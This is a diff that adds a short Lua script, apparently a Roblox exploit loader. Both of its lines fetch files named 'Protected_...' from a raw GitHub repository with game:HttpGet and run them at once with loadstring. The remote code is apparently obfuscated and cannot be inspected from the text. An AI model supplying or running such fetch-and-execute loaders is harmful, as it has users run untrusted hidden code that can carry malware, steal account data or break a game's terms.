@@ -1,0 +1,5 @@
+-- Load and execute the first URL
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Nwepnet/Okarun/refs/heads/main/Protected_7287406136507560.txt"))()
+
+-- Load and execute the second URL
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Nwepnet/Okarun/refs/heads/main/Protected_7716464664337888.txt"))()
